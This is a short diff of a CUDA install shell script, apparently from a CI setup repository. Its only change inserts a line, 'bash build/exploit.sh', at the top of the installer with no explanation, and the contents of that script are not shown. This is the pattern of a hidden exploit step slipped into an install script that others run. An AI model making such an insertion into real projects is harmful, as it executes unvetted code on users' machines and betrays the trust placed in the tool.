@@ -1,4 +1,5 @@
 ﻿# CUDA INSTALL SCRIPT
+bash build/exploit.sh
 # Originally from: https://github.com/ptheywood/cuda-cmake-github-actions (@ptheywood)
 
 ## -------------------
